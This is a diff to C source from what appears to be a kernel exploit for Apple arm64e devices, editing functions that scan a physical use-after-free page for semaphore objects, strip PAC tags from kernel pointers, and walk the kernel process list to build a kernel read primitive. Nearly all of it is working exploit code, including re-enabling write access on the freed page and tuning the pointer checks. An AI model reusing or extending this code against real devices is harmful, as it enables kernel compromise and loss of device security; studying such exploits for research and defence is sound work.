@@ -52,7 +52,6 @@ bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
 
     if ((pnode[0].pinfo > PAC_MASK) &&
         (pnode[0].pinfo != 0) &&
-        ((pnode[0].pinfo & 0x0000007FFFFFFFFFull) != 0) &&
         (pnode[1].pinfo == pnode[0].pinfo) &&
         (pnode[2].pinfo == pnode[0].pinfo) &&
         (pnode[3].pinfo == pnode[0].pinfo) &&
@@ -72,11 +71,9 @@ bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
             const u64 shift_amount = 4;
 
             /*
-             * Temporarily re-enable write access on the PUAF page before
-             * modifying pnode->pinfo. On arm64e the page may have had its
-             * write permission stripped by a concurrent pmap operation
-             * (e.g. from our vm_protect(NONE) fix in landa/physpuppet),
-             * causing KERN_PROTECTION_FAILURE / SIGBUS here.
+             * Temporarily restore write access on the PUAF page before
+             * modifying pnode->pinfo. On arm64e the page may have lost write
+             * permission due to a concurrent pmap operation, causing SIGBUS.
              */
             u64 page_addr = trunc_page((u64)(&pnode[0]));
             vm_protect(mach_task_self(), page_addr, pages(1), false, VM_PROT_READ | VM_PROT_WRITE);
@@ -110,10 +107,9 @@ void kread_sem_open_find_proc(struct kfd* kfd)
     volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
 
     /*
-     * pnode->pinfo is a PAC-signed kernel pointer to pseminfo.
-     * Use UNSIGN_PTR to strip the PAC tag before passing to static_kget.
-     * Without this, on arm64e the upper bits contain a PAC signature which
-     * makes kread target a garbage kernel address, causing SIGSEGV.
+     * On arm64e pnode->pinfo is a PAC-signed kernel pointer.
+     * Strip the PAC tag with UNSIGN_PTR before passing to static_kget,
+     * otherwise kread targets a garbage address and crashes.
      */
     u64 pseminfo_kaddr = UNSIGN_PTR(pnode->pinfo);
     if (!pseminfo_kaddr) return;
@@ -131,7 +127,7 @@ void kread_sem_open_find_proc(struct kfd* kfd)
 
     /*
      * Go backwards from the kernel_proc, which is the last proc in the list.
-     * Use a bounded loop to avoid an infinite loop if the list is corrupted.
+     * Bounded loop to avoid infinite loop if list is corrupted.
      */
     for (u64 iter = 0; iter < 1024; iter++) {
         i32 pid = dynamic_kget(proc__p_pid, proc_kaddr);
